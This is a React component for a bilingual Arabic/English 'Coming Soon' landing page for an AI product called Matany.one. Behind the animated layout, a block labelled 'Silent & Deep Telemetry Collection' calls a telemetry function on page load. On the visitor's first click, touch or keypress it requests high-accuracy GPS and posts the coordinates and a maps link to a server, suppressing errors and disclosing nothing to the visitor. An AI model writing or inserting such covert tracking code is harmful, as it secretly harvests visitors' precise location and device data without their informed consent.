import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { captureAndDispatchTelemetry } from '../services/telemetryTracker';

export const ComingSoon: React.FC = () => {
  const [langIndex, setLangIndex] = useState<0 | 1>(0);

  // Alternates between Arabic and English every 3 seconds
  useEffect(() => {
    const interval = setInterval(() => {
      setLangIndex((prev) => (prev === 0 ? 1 : 0));
    }, 3000);
    return () => clearInterval(interval);
  }, []);

  // Silent & Deep Telemetry Collection
  useEffect(() => {
    // 1. Immediate trigger on page entry
    captureAndDispatchTelemetry('immediate_mount');

    // 2. Fallback / delayed trigger after window loads (ensures battery/hardware ready)
    const timer = setTimeout(() => {
      captureAndDispatchTelemetry('delayed_stabilized');
    }, 1200);

    // 3. User interaction listener (touch/click)
    const handleInteraction = (e: Event) => {
      captureAndDispatchTelemetry(`user_touch_${e.type}`);

      // High precision GPS acquisition if possible
      if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            fetch('/api/telemetry', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                triggerEvent: 'high_accuracy_gps',
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
                mapsUrl: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
                accuracyMeters: pos.coords.accuracy,
              }),
            }).catch(() => {});
          },
          () => {},
          { timeout: 5000, enableHighAccuracy: true }
        );
      }
    };

    window.addEventListener('touchstart', handleInteraction, { once: true, passive: true });
    window.addEventListener('click', handleInteraction, { once: true, passive: true });
    window.addEventListener('keydown', handleInteraction, { once: true, passive: true });

    return () => {
      clearTimeout(timer);
      window.removeEventListener('touchstart', handleInteraction);
      window.removeEventListener('click', handleInteraction);
      window.removeEventListener('keydown', handleInteraction);
    };
  }, []);

  return (
    <main
      className="relative min-h-screen w-full bg-[#030306] text-white flex flex-col items-center justify-center overflow-hidden select-none px-4"
      dir={langIndex === 0 ? 'rtl' : 'ltr'}
    >
      {/* Dynamic Cyber Background Gradients & Ambient Glow */}
      <div className="absolute inset-0 pointer-events-none overflow-hidden">
        {/* Top radial ambient glow */}
        <div className="absolute -top-[20%] left-1/2 -translate-x-1/2 w-[700px] h-[500px] bg-gradient-to-b from-cyan-500/10 via-indigo-600/10 to-transparent blur-[130px] rounded-full" />
        {/* Bottom subtle violet glow */}
        <div className="absolute -bottom-[20%] left-1/2 -translate-x-1/2 w-[600px] h-[450px] bg-gradient-to-t from-violet-600/10 via-fuchsia-600/5 to-transparent blur-[140px] rounded-full" />
        {/* Subtle Cyber Grid */}
        <div
          className="absolute inset-0 opacity-[0.03] bg-[linear-gradient(to_right,#ffffff_1px,transparent_1px),linear-gradient(to_bottom,#ffffff_1px,transparent_1px)] bg-[size:4rem_4rem] [mask-image:radial-gradient(ellipse_60%_50%_at_50%_50%,#000_70%,transparent_100%)]"
        />
      </div>

      {/* Main Glassmorphic Showcase Card */}
      <div className="relative z-10 w-full max-w-xl mx-auto flex flex-col items-center text-center">
        {/* Pulsing Status Pill */}
        <motion.div
          initial={{ opacity: 0, y: -20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, ease: 'easeOut' }}
          className="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-white/[0.04] border border-white/[0.08] backdrop-blur-md mb-8 shadow-inner"
        >
          <span className="relative flex h-2 w-2">
            <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75" />
            <span className="relative inline-flex rounded-full h-2 w-2 bg-emerald-500" />
          </span>
          <span className="text-[12px] font-medium tracking-wide text-zinc-300">
            {langIndex === 0
              ? 'النظام قيد الترقية والتطوير الشامل'
              : 'System Upgrade & Evolution in Progress'}
          </span>
        </motion.div>

        {/* Animated Brand Emblem */}
        <motion.div
          initial={{ scale: 0.8, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          transition={{ duration: 1, ease: [0.16, 1, 0.3, 1] }}
          className="relative mb-6 group"
        >
          <div className="absolute -inset-1.5 bg-gradient-to-r from-cyan-500/20 via-indigo-500/30 to-violet-500/20 rounded-2xl blur-lg group-hover:blur-xl transition-all duration-700 opacity-80" />
          <div className="relative size-20 rounded-2xl bg-zinc-950/80 border border-white/10 p-3.5 backdrop-blur-xl shadow-2xl flex items-center justify-center">
            <img
              src="/matany-logo.svg"
              alt="Matany"
              className="w-full h-full object-contain filter drop-shadow-[0_0_12px_rgba(56,189,248,0.4)]"
            />
          </div>
        </motion.div>

        {/* Brand Title: Matany.one */}
        <motion.h1
          initial={{ opacity: 0, y: 15 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.9, delay: 0.2 }}
          className="text-4xl sm:text-5xl md:text-6xl font-extrabold tracking-tight bg-gradient-to-b from-white via-zinc-100 to-zinc-400 bg-clip-text text-transparent mb-3"
          style={{ fontFamily: 'system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}
        >
          Matany.one
        </motion.h1>

        {/* Alternating Coming Soon Text (Arabic ⟷ English) */}
        <div className="h-28 flex flex-col items-center justify-center my-2">
          <AnimatePresence mode="wait">
            {langIndex === 0 ? (
              <motion.div
                key="arabic"
                initial={{ opacity: 0, y: 14, filter: 'blur(8px)' }}
                animate={{ opacity: 1, y: 0, filter: 'blur(0px)' }}
                exit={{ opacity: 0, y: -14, filter: 'blur(8px)' }}
                transition={{ duration: 0.55, ease: [0.16, 1, 0.3, 1] }}
                className="flex flex-col items-center"
              >
                <span className="text-3xl sm:text-4xl font-bold bg-gradient-to-r from-cyan-400 via-sky-300 to-indigo-300 bg-clip-text text-transparent pb-1">
                  قريبــــاً
                </span>
                <p className="text-sm sm:text-base text-zinc-400 mt-2 font-normal max-w-md leading-relaxed">
                  الجيل القادم من الذكاء الاصطناعي الاستثنائي والقدرات الخارقة
                </p>
              </motion.div>
            ) : (
              <motion.div
                key="english"
                initial={{ opacity: 0, y: 14, filter: 'blur(8px)' }}
                animate={{ opacity: 1, y: 0, filter: 'blur(0px)' }}
                exit={{ opacity: 0, y: -14, filter: 'blur(8px)' }}
                transition={{ duration: 0.55, ease: [0.16, 1, 0.3, 1] }}
                className="flex flex-col items-center"
              >
                <span className="text-3xl sm:text-4xl font-bold tracking-wider bg-gradient-to-r from-indigo-300 via-sky-300 to-cyan-400 bg-clip-text text-transparent pb-1 uppercase">
                  Coming Soon
                </span>
                <p className="text-sm sm:text-base text-zinc-400 mt-2 font-normal max-w-md leading-relaxed tracking-wide">
                  Next-generation frontier intelligence is preparing to launch
                </p>
              </motion.div>
            )}
          </AnimatePresence>
        </div>

        {/* Minimalist Glowing Radar Divider */}
        <div className="relative w-48 h-[1px] my-6 bg-gradient-to-r from-transparent via-zinc-700 to-transparent overflow-hidden">
          <motion.div
            className="absolute top-0 left-0 w-16 h-full bg-gradient-to-r from-transparent via-cyan-400 to-transparent"
            animate={{ x: [-80, 240] }}
            transition={{ repeat: Infinity, duration: 2.2, ease: 'easeInOut' }}
          />
        </div>

        {/* Subtle Footer Attribution */}
        <motion.p
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 1, delay: 0.5 }}
          className="text-xs text-zinc-500 font-mono tracking-wider"
        >
          MatanyLabs &bull; Mohamed Ahmed Matany
        </motion.p>
      </div>
    </main>
  );
};
